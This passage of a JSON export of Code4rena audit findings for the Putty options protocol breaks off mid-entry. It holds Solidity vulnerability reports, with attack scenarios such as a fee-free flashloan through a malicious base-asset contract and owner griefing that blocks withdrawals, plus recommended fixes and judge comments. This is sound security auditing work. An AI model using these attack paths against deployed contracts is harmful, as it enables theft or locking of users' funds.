      "content": "_Submitted by horsefacts, also found by 0xc0ffEE, 0xsanson, berndartmueller, BowTiedWardens, csanuragjain, defsec, IllIllI, joestakey, Kenshin, Picodes, shenwilly, Sm4rty, unforgiven, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L302-L308>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11-L18>\n\n### Vulnerability Details\n\nPutty uses ERC721 `safeTransfer` and `safeTransferFrom` throughout the codebase to ensure that ERC721 tokens are not transferred to non ERC721 receivers. However, the initial position mint in `fillOrder` uses `_mint` rather than `_safeMint` and does not check that the receiver accepts ERC721 token transfers:\n\n[`PuttyV2#fillOrder`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L302-L308)\n\n```solidity\n        // create long/short position for maker\n        _mint(order.maker, uint256(orderHash));\n\n        // create opposite long/short position for taker\n        bytes32 oppositeOrderHash = hashOppositeOrder(order);\n        positionId = uint256(oppositeOrderHash);\n        _mint(msg.sender, positionId);\n```\n\n[`PuttyV2Nft#_mint`](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11-L18)\n\n```solidity\n    function _mint(address to, uint256 id) internal override {\n        require(to != address(0), \"INVALID_RECIPIENT\");\n        require(_ownerOf[id] == address(0), \"ALREADY_MINTED\");\n\n        _ownerOf[id] = to;\n\n        emit Transfer(address(0), to, id);\n    }\n```\n\n### Impact\n\nIf a maker or taker are a contract unable to receive ERC721 tokens, their options positions may be locked and nontransferable. If the receiving contract does not provide a mechanism for interacting with Putty, they will be unable to exercise their position or withdraw assets.\n\n### Recommendation\n\nConsider implementing the `require` check in Solmate's `ERC721#_safeMint` in your own mint function:\n\n```solidity\n    function _safeMint(address to, uint256 id) internal virtual {\n        _mint(to, id);\n\n        require(\n            to.code.length == 0 ||\n                ERC721TokenReceiver(to).onERC721Received(msg.sender, address(0), id, \"\") ==\n                ERC721TokenReceiver.onERC721Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n```\n\nHowever, note that calling `_safeMint` introduces a reentrancy opportunity! If you make this change, ensure that the mint is treated as an interaction rather than an effect, and consider adding a reentrancy guard:\n\n```solidity\n        /*  ~~~ EFFECTS ~~~ */\n\n        // create opposite long/short position for taker\n        bytes32 oppositeOrderHash = hashOppositeOrder(order);\n        positionId = uint256(oppositeOrderHash);\n\n        // save floorAssetTokenIds if filling a long call order\n        if (order.isLong && order.isCall) {\n            positionFloorAssetTokenIds[uint256(orderHash)] = floorAssetTokenIds;\n        }\n\n        // save the long position expiration\n        positionExpirations[order.isLong ? uint256(orderHash) : positionId] = block.timestamp + order.duration;\n\n        emit FilledOrder(orderHash, floorAssetTokenIds, order);\n\n        /* ~~~ INTERACTIONS ~~~ */\n\n        _safeMint(order.maker, uint256(orderHash));\n        _safeMint(msg.sender, positionId);\n```\n\nAlternatively, document the design decision to use `_mint` and the associated risk for end users.\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/327#issuecomment-1176613220):**\n> It's unlikely a contract will have all the setup required to interact with PuttyV2 but not be able to handle ERC721 tokens. Adding a check via safeMint adds a gas overhead as well as another re-entrancy attack vector so there is a tradeoff (as noted in the issue report^^).\n\n> Report: Contracts that can’t handle ERC721 tokens will lose their Putty ERC721 position tokens.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/327#issuecomment-1183141452):**\n > In addition, some contracts may have custom logic in their `onERC721Received()` implementation that is triggered only by the safe methods and not their \"unsafe\" counterparts.\n\n***\n\n",
      "summary": "\nThis bug report is about the Putty codebase, which uses ERC721 `safeTransfer` and `safeTransferFrom` throughout the codebase to ensure that ERC721 tokens are not transferred to non ERC721 receivers. However, the initial position mint in `fillOrder` uses `_mint` rather than `_safeMint` and does not check that the receiver accepts ERC721 token transfers.\n\nIf a maker or taker are a contract unable to receive ERC721 tokens, their options positions may be locked and nontransferable. If the receiving contract does not provide a mechanism for interacting with Putty, they will be unable to exercise their position or withdraw assets.\n\nTo fix this issue, it is recommended to implement the `require` check in Solmate's `ERC721#_safeMint` in the mint function. However, note that calling `_safeMint` introduces a reentrancy opportunity and the mint should be treated as an interaction rather than an effect, and consider adding a reentrancy guard. Alternatively, document the design decision to use `_mint` and the associated risk for end users.",
      "quality_score": 2,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/327",
      "tags": [
        "mint vs safeMint"
      ],
      "finders": [
        "csanuragjain",
        "IllIllI",
        "0xsanson",
        "BowTiedWardens",
        "Picodes",
        "joestakey",
        "xiaoming90",
        "berndartmueller",
        "shenwilly",
        "0xc0ffEE",
        "unforgiven",
        "Kenshin",
        "horsefacts",
        "Sm4rty",
        "defsec"
      ]
    },
    {
      "id": "2942",
      "title": "[M-09] The contract serves as a flashloan pool without fee",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xc0ffEE, also found by horsefacts, pedroais, and unforgiven_\n\nThe malicious user could leverage PuttyV2 contract to flashloan without paying fee the assets to make profit.\n\nConsider a scenario that maker and taker is the same, and is a contract\n\n1.  The contract call PuttyV2.`fillOrder` with a Long Call order that has `order.baseAssets` references to a contract having custom logic other than standard ERC20. The order also specify `erc20Assets` to the `token` and `tokenAmount` that PuttyV2 contract is owing (similar to `erc721Assets`)\n2.  When the execution is at <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>, the custom logic could execute on the contract address `order.baseAsset`.\n3.  The malicious contract then call `exercise` to exercise the short call position. This call will transfer out the assets specified in the order to the malicious contract by executing logics in `_transferERC20sOut, _transferERC721sOut`\n4.  The contract uses that assets to make profit on other platforms. After that, the execution continues at <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>.\n5.  At the end of `fillOrder`, the contract just transfers enough assets back to PuttyV2 by executing logics in `_transferERC20sIn, _transferERC721sIn` to finish the execution.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1174509620):**\n> Warden is saying that they can flashloan without fee, but any exercised option will pay a 3% fee, additionally the order of operations shown (gain control on base.asset.transfer when receiving premium), would mean that the order ERC20s and NFTs have yet to be transferred in, so a \"mid-fillOrder\" \"exercise\" would not only pay the fee, but also revert due to lack of the tokens.\n\n**[Pedroais (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1174999561):**\n> The 3% will be paid in the fake asset since base asset is an attacker contract so there is no fee to perform the attack. \n> \n> This attack is done with assets that are already inside the contract so there is no revert in transfer out.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1175061981):**\n > Acknowledging that technically this is true.\n> Although no easy mitigation exists as far as I can see aside from adding nonReentrant to exercise and fillOrder - adding a non-negligible gas overhead.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1175108315):**\n > I agree that the finding is valid, the fee can be paid in a mintable token to gain temporary ownership of a token underlying which is repaid at the end of `fillOrder`.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1178994409):**\n > Report: It’s possible to flashloan all assets in the contract without paying a protocol fee.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/377#issuecomment-1182823327):**\n > Flash loans from the contract would be a feature, not a bug. However, being able to do so without paying a protocol fee (ie. paying in fake tokens) wouldn't be great. \n> \n\n***\n\n",
      "summary": "\nA bug has been reported in the PuttyV2 contract, which could allow a malicious user to leverage the contract to flashloan without paying a fee. This could result in the malicious user making a profit at the expense of the contract. \n\nThe bug occurs when the maker and taker are the same, and is a contract. The contract calls PuttyV2.fillOrder with a Long Call order that has order.baseAssets references to a contract with custom logic other than the standard ERC20. The order also specifies erc20Assets to the token and tokenAmount that PuttyV2 contract is owing. \n\nWhen the execution reaches a certain point, the custom logic could be executed on the contract address order.baseAsset. The malicious contract then calls exercise to exercise the short call position. This call will transfer out the assets specified in the order to the malicious contract by executing logics in _transferERC20sOut, _transferERC721sOut. \n\nThe malicious contract then uses the assets to make a profit on other platforms, and then transfers enough assets back to PuttyV2 by executing logics in _transferERC20sIn, _transferERC721sIn to finish the execution. \n\nThis bug could have serious implications for the PuttyV2 contract, and should be addressed as soon as possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/377",
      "tags": [],
      "finders": [
        "0xc0ffEE",
        "unforgiven",
        "pedroais",
        "horsefacts"
      ]
    },
    {
      "id": "2941",
      "title": "[M-08] Overlap Between ERC721.transferFrom() and ERC20.transferFrom() Allows order.erc20Assets or order.baseAsset To Be ERC721 Rather Than ERC20",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L344\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L360\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L601\n\n\n## Vulnerability details\n\n## Impact\n\nBoth `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. The impact of this is it's possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20.\n\nThese functions will successfully transfer the NFT into the protocol however they will fail to transfer the NFT out of the contract. That is because the outgoing transfer is `ERC20.safeTransfer()` which calls `transfer(to, amount)` which does not match up with any valid function signatures on ERC721.\n\nTherefore any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract as neither `exercise()` nor `withdraw()` will successfully transfer the tokens out of the contract.\n\n## Proof of Concept\n\n[ERC721.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC721.sol#L82-L86)\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public virtual {\n```\n\n[ERC20.trasnferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC20.sol#L90-L94)\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n```\n\n## Recommended Mitigation Steps\n\nConsider whitelisting approved ERC721 and ERC20 token contracts. Furthermore, separate these two contracts into different whitelists for ERC20s and ERC721s then ensure each contract is in the right category.",
      "summary": "\nThis bug report describes a vulnerability in the code of a project hosted on GitHub. The vulnerability is that the functions `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. This means that it is possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20. As a result, any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract and unable to be transferred out.\n\nProof of concept code is provided to demonstrate the vulnerability. The recommended mitigation steps are to consider whitelisting approved ERC721 and ERC20 token contracts, and to separate these two contracts into different whitelists for ERC20s and ERC721s to ensure each contract is in the right category.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/52",
      "tags": [],
      "finders": [
        "reassor  sseefried",
        "kirk-baird"
      ]
    },
    {
      "id": "2940",
      "title": "[M-07] An attacker can create a short put option order on an NFT that does not support ERC721 (like cryptopunk), and the user can fulfill the order, but cannot exercise the option",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by IllIllI and minhquanym_\n\nAn attacker can create a short put option on cryptopunk. When the user fulfills the order, the baseAsset will be transferred to the contract. \n\nHowever, since cryptopunk does not support ERC721, the user cannot exercise the option because the safeTransferFrom function call fails. Attacker can get premium and get back baseAsset after option expires.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L343-L346>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L628-L629>\n\n### Recommended Mitigation Steps\n\nConsider adding a whitelist to nfts in the order, or consider supporting exercising on cryptopunk.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1174823604):**\n > Putty uses solmate's `ERC721.safeTransferFrom` which requires that the NFT contract implements `onERC721Received`. For the case of OG NFTs like punks and rocks, this will fail, https://github.com/Rari-Capital/solmate/blob/main/src/tokens/ERC721.sol#L120\n\n**[thereksfour (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1175910424):**\n > The user does not need to send cryptopunk to the contract when fulfilling the short put option order, but the user will pay a premium to the order creator. Later, when the user wants to exercise the option, since the cryptopunk does not support safetransferfrom, the user cannot exercise the option.\n\n**[STYJ (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1176031452):**\n > > The user does not need to send cryptopunk to the contract when fulfilling the short put option order, but the user will pay a premium to the order creator. Later, when the user wants to exercise the option, since the cryptopunk does not support safetransferfrom, the user cannot exercise the option.\n> \n> Sorry, I did not consider this path. You are correct to say that a maker can create a short put option order with cryptopunks as a token and the holder of the long put option will not be able to exercise since cryptopunks cannot be transferred with `safeTransferFrom`. From that perspective, this is a valid issue. Thank you for bringing it up. I will defer to the judge for the final decision.\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1178923868):**\n > We dont intend to support cryptopunks or cryptokitties.\n> If users wish to use these tokens then they can get wrapped versions (ex: wrapped cryptopunks).\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/16#issuecomment-1181762798):**\n > I thought cryptokitties are ERC721? I think they were the ones who popularized the standard actually :p \n> Probably meant etherrocks.\n> \n> In general, non-compliant ERC-721 NFTs can be supported through wrappers, though some users might be unaware... Downgrading to med severity, similar to [this issue from another contest](https://github.com/code-423n4/2022-02-foundation-findings/issues/74).\n> \n> \n\n**hyh (warden) reviewed mitigation:**\n > Similar to [M-01](https://github.com/code-423n4/2022-06-putty-findings/issues/50), [M-02](https://github.com/code-423n4/2022-06-putty-findings/issues/227).\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with PuttyV2.sol, a smart contract. An attacker can create a short put option on cryptopunk, a non-fungible token (NFT). When the user fulfills the order, the baseAsset will be transferred to the contract. However, since cryptopunk does not support ERC721, the user cannot exercise the option because the safeTransferFrom function call fails. The attacker can get a premium and get back the baseAsset after the option expires. The code for this vulnerability can be found in lines 343-346 and 628-629 of PuttyV2.sol. To mitigate this issue, the developers should consider adding a whitelist to NFTs in the order, or consider supporting exercising on cryptopunk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/16",
      "tags": [],
      "finders": [
        "cccz",
        "IllIllI  minhquanym"
      ]
    },
    {
      "id": "2939",
      "title": "[M-06] [Denial-of-Service] Contract Owner Could Block Users From Withdrawing Their Strike",
      "impact": "MEDIUM",
      "content": "_Submitted by xiaoming90, also found by berndartmueller_\n\nWhen users withdraw their strike escrowed in Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500>\n\n```solidity\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n\n\t// transfer strike to owner if put is expired or call is exercised\n\tif ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n\t\t// send the fee to the admin/DAO if fee is greater than 0%\n\t\tuint256 feeAmount = 0;\n\t\tif (fee > 0) {\n\t\t\tfeeAmount = (order.strike * fee) / 1000;\n\t\t\tERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n\t\t}\n\n\t\tERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n\t\treturn;\n\t}\n\t..SNIP..\n}\n```\n\nThere are two methods on how the owner can deny user from withdrawing their strike amount from the contract\n\n#### Method #1 - Set the `owner()` to `zero` address\n\nMany of the token implementations do not allow transfer to `zero` address ([Reference](https://github.com/d-xo/weird-erc20#revert-on-transfer-to-the-zero-address)). Popular ERC20 implementations such as the following Openzeppelin's ERC20 implementation do not allow transfer to `zero` address, and will revert immediately if the `to` address (recipient) points to a `zero` address during a transfer.\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fbf494511fd522b931f7f92e2df87d671ea8b0b/contracts/token/ERC20/ERC20.sol#L226>\n\n```solidity\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal virtual {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n\n    _beforeTokenTransfer(from, to, amount);\n\n    uint256 fromBalance = _balances[from];\n    require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    unchecked {\n        _balances[from] = fromBalance - amount;\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n        // decrementing then incrementing.\n        _balances[to] += amount;\n    }\n\n    emit Transfer(from, to, amount);\n\n    _afterTokenTransfer(from, to, amount);\n}\n```\n\nIt is possible for the owner to transfer the ownership to a `zero` address, thus causing the fee transfer to the contract owner to always revert. When the fee transfer always reverts, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that adopt a `baseAsset` that reverts when transferring to `zero` address.\n\n#### Method #2 - If `baseAsset` is a ERC777 token\n\n> Note: `owner()` could point to a contract or EOA account. By pointing to a contract, the contract could implement logic to revert whenever someone send tokens to it.\n\nERC777 contains a `tokensReceived` hook that will notify the recipient whenever someone sends some tokens to the recipient .\n\nAssuming that the `baseAsset` is a ERC77 token, the recipient, which is the `owner()` in this case, could always revert whenever `PuttyV2` contract attempts to send the fee to recipient. This will cause the `withdraw` function to revert too. As a result, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that has ERC777 token as its `baseAsset`.\n\n### Impact\n\nUser cannot withdraw their strike amount and their asset will be stuck in the contract.\n\n### Recommended Mitigation Steps\n\nIt is recommended to adopt a [withdrawal pattern](https://docs.soliditylang.org/en/v0.8.15/common-patterns.html#withdrawal-from-contracts) for retrieving owner fee.\n\nInstead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the `PuttyV2` contract.\n\nConsider the following implementation. In the following example, there is no way for the owner to perform denial-of-user because the outcome of the fee transfer (succeed or fail) to the owner will not affect the user's strike withdrawal process.\n\nThis will give users more assurance and confidence about the security of their funds stored within Putty.\n\n```solidity\nmapping(address => uint256) public ownerFees;\n\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n    // transfer strike to owner if put is expired or call is exercised\n    if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n        // send the fee to the admin/DAO if fee is greater than 0%\n        uint256 feeAmount = 0;\n        if (fee > 0) {\n            feeAmount = (order.strike * fee) / 1000;\n            ownerFees[order.baseAsset] += feeAmount\n        }\n\n        ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n        return;\n    }\n    ..SNIP..\n}\n\nfunction withdrawFee(address baseAsset) public onlyOwner {\n\tuint256 _feeAmount = ownerFees[baseAsset];\n\townerFees[baseAsset] = 0;\n\tERC20(baseAsset).safeTransfer(owner(), _feeAmount);\n}\n```\n**[outdoteth (Putty Finance) disagreed with severity](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1177678807)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1179936225):**\n > The scenarios provided are valid, especially for baseAssets that revert on zero-address transfer.\n> \n> While the likelihood is low, assets are lost and cannot be retrieved.<br>\n> `3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).`\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1181754248):**\n > Thinking about it further, the external conditions / requirements needed for the DoS to happen are somewhat strong.\n> - the ERC777 attack requires `owner()` or the token to be engineered to be malicious and adopted.\n> - DoS via revoking ownership requires `fee` to be non-zero first, which is unlikely to happen. I can classify this as a \"user-prone\" bug, which would be similar to cases like including ETH when WETH is intended to be used (#226).\n> \n> Hence, I think medium severity is more appropriate:\n> `2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1185411399):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269): as the platform fee is now transferred on order filling, any owner griefing can only yield a denial of service. There will be no loss of funds as this way position is only about to be created when the fee is transferred.\n\n***\n\n",
      "summary": "\nThis bug report is concerning the PuttyV2 contract, which is a smart contract used to facilitate the trading of options. When users withdraw their strike escrowed in the Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users. \n\nThe bug is that, there are two methods on how the owner can deny user from withdrawing their strike amount from the contract. The first method is to set the owner() to zero address. This is because many of the token implementations do not allow transfer to zero address, and will revert immediately if the to address (recipient) points to a zero address during a transfer. The second method is if the baseAsset is a ERC777 token. This is because ERC777 contains a tokensReceived hook that will notify the recipient whenever someone sends some tokens to the recipient. The recipient, which is the owner() in this case, could always revert whenever PuttyV2 contract attempts to send the fee to recipient. This will cause the withdraw function to revert too.\n\nThe impact of this bug is that users cannot withdraw their strike amount and their asset will be stuck in the contract.\n\nThe recommended mitigation steps to fix this bug is to adopt a withdrawal pattern for retrieving owner fee. Instead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the PuttyV2 contract. This will give users more assurance and confidence about the security of their funds stored within Putty.",
      "quality_score": 4.583333333333333,
      "rarity_score": 4.428571428571429,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/296",
      "tags": [
        "DOS",
        "Withdraw Pattern",
        "ERC20",
        "ERC777"
      ],
      "finders": [
        "berndartmueller",
        "xiaoming90"
      ]
    },
    {
      "id": "2938",
      "title": "[M-05] fillOrder() and exercise() may lock Ether sent to the contract, forever",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436\n\n\n## Vulnerability details\n\n## Impact\n`fillOrder()` and `exercise()` have code paths that require Ether to be sent to them (e.g. using WETH as the base asset, or the provision of the exercise price), and therefore those two functions have the `payable` modifier. However, there are code paths within those functions that do not require Ether. Ether passed to the functions, when the non-Ether code paths are taken, is locked in the contract forever, and the sender gets nothing extra in return for it.\n\n\n## Proof of Concept\nEther can't be pulled from the `order.maker` during the filling of a long order, so `msg.value` shouldn't be provided here:\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n323           if (order.isLong) {\n324               ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n325           } else {\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L323-L325\n\n\nIf the `baseAsset` isn't WETH during order fulfillment, `msg.value` is unused:\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n337               } else {\n338                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n339               }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L337-L339\n\n\nSame for the exercise of call options:\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n435               } else {\n436                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n437               }\n```\nhttps://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437\n\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAdd a `require(0 == msg.value)` for the above three conditions",
      "summary": "\nThis bug report is related to a code inspection of the PuttyV2.sol file. The bug report has identified three code paths that require Ether to be sent to them but do not return anything to the sender. This could result in Ether being locked in the contract forever, with the sender not receiving anything in return. The code paths identified are found at lines 324, 338, and 436. \n\nThe recommended mitigation steps are to add a `require(0 == msg.value)` for these three conditions. This will ensure that no Ether is sent to the contract when these code paths are taken.\n\nTo summarize, this bug report has identified a code issue in the PuttyV2.sol file that could result in Ether being locked in the contract forever. The recommended mitigation steps are to add a `require(0 == msg.value)` for the identified code paths.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/226",
      "tags": [],
      "finders": [
        "zzzitron_",
        "xiaoming90",
        "berndartmueller",
        "0x29A",
        "sashiketh",
        "danb",
        "BowTiedWardens",
        "joestakey",
        "0xDjango",
        "peritoflores",
        "oyc109",
        "IllIllI",
        "swit",
        "simon135",
        "cccz",
        "auditor0517",
        "dirky",
        "hansfriese",
        "horsefacts",
        "sseefried",
        "AmitN",
        "rfa",
        "StErMi",
        "kirk-baird",
        "dipp",
        "0xc0ffEE",
        "hyh"
      ]
    },
    {
      "id": "2937",
      "title": "[M-04] Put options are free of any fees",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by 0xsanson, hubble, Lambda, Metatron, and swit_\n\nFees are expected to be paid whenever an option is exercised (as per the function comment on [L235](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L235)).\n\n#### Put options\n\nIf a put option is exercised, the exerciser receives the strike price (initially deposited by the short position holder) denominated in `order.baseAsset`.\n\n#### Call options\n\nIf a call option is exercised, the exerciser sends the strike price to Putty and the short position holder is able to withdraw the strike amount.\n\nHowever, the current protocol implementation is missing to deduct fees for exercised put options. Put options are free of any fees.\n\n### Proof of Concept\n\nThe protocol fee is correctly charged for exercised calls:\n\n[PuttyV2.withdraw](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L494-L506)\n\n```solidity\n// transfer strike to owner if put is expired or call is exercised\nif ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n    // send the fee to the admin/DAO if fee is greater than 0%\n    uint256 feeAmount = 0;\n    if (fee > 0) {\n        feeAmount = (order.strike * fee) / 1000;\n        ERC20(order.baseAsset).safeTransfer(owner(), feeAmount); // @audit DoS due to reverting erc20 token transfer (weird erc20 tokens, blacklisted or paused owner; erc777 hook on owner receiver side can prevent transfer hence reverting and preventing withdrawal) - use pull pattern @high  // @audit zero value token transfers can revert. Small strike prices and low fee can lead to rounding down to 0 - check feeAmount > 0 @high  // @audit should not take fees if renounced owner (zero address) as fees can not be withdrawn @medium\n    }\n\n    ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount); // @audit fee should not be paid if strike is simply returned to short owner for expired put @high\n\n    